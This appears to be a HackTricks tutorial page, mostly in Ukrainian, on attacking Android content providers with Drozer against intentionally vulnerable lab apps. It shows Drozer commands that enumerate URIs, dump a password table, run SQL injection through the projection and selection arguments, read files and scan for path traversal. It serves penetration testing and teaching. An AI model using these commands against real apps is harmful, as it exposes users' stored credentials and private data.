# Exploiting Content Providers

## Exploiting Content Providers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Intro

–î–∞–Ω—ñ **–ø–æ—Å—Ç–∞—á–∞—é—Ç—å—Å—è –∑ –æ–¥–Ω–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É –¥–æ —ñ–Ω—à–∏—Ö** –Ω–∞ –∑–∞–ø–∏—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º, –≤—ñ–¥–æ–º–∏–º —è–∫ **content provider**. –¶—ñ –∑–∞–ø–∏—Ç–∏ –∫–µ—Ä—É—é—Ç—å—Å—è —á–µ—Ä–µ–∑ –º–µ—Ç–æ–¥–∏ **ContentResolver class**. Content providers –º–æ–∂—É—Ç—å –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ —Å–≤–æ—ó –¥–∞–Ω—ñ –≤ —Ä—ñ–∑–Ω–∏—Ö –º—ñ—Å—Ü—è—Ö, —Ç–∞–∫–∏—Ö —è–∫ **–±–∞–∑–∞ –¥–∞–Ω–∏—Ö**, **—Ñ–∞–π–ª–∏** –∞–±–æ —á–µ—Ä–µ–∑ **–º–µ—Ä–µ–∂—É**.

–£ —Ñ–∞–π–ª—ñ _Manifest.xml_ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –æ–≥–æ–ª–æ—Å–∏—Ç–∏ content provider. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ `content://com.mwr.example.sieve.DBContentProvider/Keys`, –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª `READ_KEYS`. –¶—ñ–∫–∞–≤–æ –≤—ñ–¥–∑–Ω–∞—á–∏—Ç–∏, —â–æ —à–ª—è—Ö `/Keys/` –¥–æ—Å—Ç—É–ø–Ω–∏–π —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —è–∫–∏–π –Ω–µ –∑–∞—Ö–∏—â–µ–Ω–∏–π —á–µ—Ä–µ–∑ –ø–æ–º–∏–ª–∫—É —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞, —è–∫–∏–π –∑–∞—Ö–∏—Å—Ç–∏–≤ `/Keys`, –∞–ª–µ –æ–≥–æ–ª–æ—Å–∏–≤ `/Keys/`.

**–ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —è–∫—É—Å—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å (SQL Injection –∞–±–æ Path Traversal).**

## –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ **–≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∫–æ–Ω—Ç–µ–Ω—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä—ñ–≤**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
–ú–æ–∂–ª–∏–≤–æ –∑—ñ–±—Ä–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ç–µ, —è–∫ –¥–æ—Å—è–≥—Ç–∏ **DBContentProvider**, –ø–æ—á–∏–Ω–∞—é—á–∏ URI –∑ ‚Äú_content://_‚Äù. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ –≤–∏—Å–Ω–æ–≤–∫–∞—Ö, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Drozer, –¥–µ –∫–ª—é—á–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–Ω–∞—Ö–æ–¥–∏–ª–∞—Å—è –≤ _/Keys_ –∫–∞—Ç–∞–ª–æ–∑—ñ.

Drozer –º–æ–∂–µ **–≤–≥–∞–¥—É–≤–∞—Ç–∏ —ñ –ø—Ä–æ–±—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ URI**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
–í–∞–º —Ç–∞–∫–æ–∂ —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–∫–æ–¥ ContentProvider**, —â–æ–± –∑–Ω–∞–π—Ç–∏ –∑–∞–ø–∏—Ç–∏:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

–¢–∞–∫–æ–∂, —è–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø–æ–≤–Ω—ñ –∑–∞–ø–∏—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —è–∫—ñ —ñ–º–µ–Ω–∞ –æ–≥–æ–ª–æ—à–µ–Ω—ñ ContentProvider** —É –º–µ—Ç–æ–¥—ñ `onCreate`:

![](<../../../.gitbook/assets/image (564).png>)

–ó–∞–ø–∏—Ç –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —Ç–∞–∫: `content://name.of.package.class/declared_name`

## **Content Providers –Ω–∞ –æ—Å–Ω–æ–≤—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**

–ô–º–æ–≤—ñ—Ä–Ω–æ, –±—ñ–ª—å—à—ñ—Å—Ç—å Content Providers –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —è–∫ **—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å** –¥–ª—è **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–µ—ó –¥–æ—Å—Ç—É–ø, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤–∏—Ç—è–≥—É–≤–∞—Ç–∏, –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏, –≤—Å—Ç–∞–≤–ª—è—Ç–∏ —Ç–∞ –≤–∏–¥–∞–ª—è—Ç–∏** —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.\
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó** –∞–±–æ —Å–ø—Ä–æ–±—É–π—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —ó—ó, —â–æ–± **–æ–±—ñ–π—Ç–∏ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó**.

–ü–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –∫–æ–¥ Content Provider, **–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É** —Ç–∞–∫–æ–∂ –Ω–∞ **—Ñ—É–Ω–∫—Ü—ñ—ó**, –Ω–∞–∑–≤–∞–Ω—ñ —è–∫: _query, insert, update —ñ delete_:

![](<../../../.gitbook/assets/image (887).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

–û—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∑–º–æ–∂–µ—Ç–µ —ó—Ö –≤–∏–∫–ª–∏–∫–∞—Ç–∏

### –ó–∞–ø–∏—Ç –∫–æ–Ω—Ç–µ–Ω—Ç—É
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Insert content

–ó–∞–ø–∏—Ç—É—é—á–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö, –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—è **–Ω–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤**, —Ç–æ–¥—ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–∞–Ω—ñ –≤ –ë–î:

![](<../../../.gitbook/assets/image (98).png>)

![](<../../../.gitbook/assets/image (173).png>)

_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ insert —ñ update –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ --string –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è —Ä—è–¥–∫–∞, --double –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –¥—ñ–π—Å–Ω–æ–≥–æ —á–∏—Å–ª–∞, --float, --integer, --long, --short, --boolean_

### Update content

–ó–Ω–∞—é—á–∏ –Ω–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Å–∏**:

![](<../../../.gitbook/assets/image (780).png>)

### Delete content

![](<../../../.gitbook/assets/image (423).png>)

### **SQL Injection**

–ü—Ä–æ—Å—Ç–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ SQL-—ñ–Ω'—î–∫—Ü—ñ—é **(SQLite)** - —Ü–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ **projection** —ñ **selection fields**, —è–∫—ñ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –∫–æ–Ω—Ç–µ–Ω—Ç—É.\
–ü—Ä–∏ –∑–∞–ø–∏—Ç—ñ –¥–æ Content Provider —î 2 —Ü—ñ–∫–∞–≤—ñ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø–æ—à—É–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó: _--selection_ —ñ _--projection_:

![](<../../../.gitbook/assets/image (784).png>)

–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** —Ü–∏–º–∏ **–ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏** –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ **SQL-—ñ–Ω'—î–∫—Ü—ñ–π**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è SQL-—ñ–Ω'—î–∫—Ü—ñ–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Drozer**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Content Providers, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è —Ñ–∞–π–ª–æ–≤–æ—é —Å–∏—Å—Ç–µ–º–æ—é**

Content providers —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤:**

![](<../../../.gitbook/assets/image (407).png>)

### –ß–∏—Ç–∞—Ç–∏ **—Ñ–∞–π–ª**

–í–∏ –º–æ–∂–µ—Ç–µ —á–∏—Ç–∞—Ç–∏ —Ñ–∞–π–ª–∏ –∑ Content Provider
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **–ü–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É**

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –ü–µ—Ä–µ—Ö—ñ–¥–æ–º –ø–æ —à–ª—è—Ö—É (–≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ –Ω–µ —î –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ "_../_" —Ç–∞ –ø–æ–¥—ñ–±–Ω—ñ —Ç—Ä—é–∫–∏).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è –æ–±—Ö–æ–¥—É —à–ª—è—Ö—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Drozer**
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
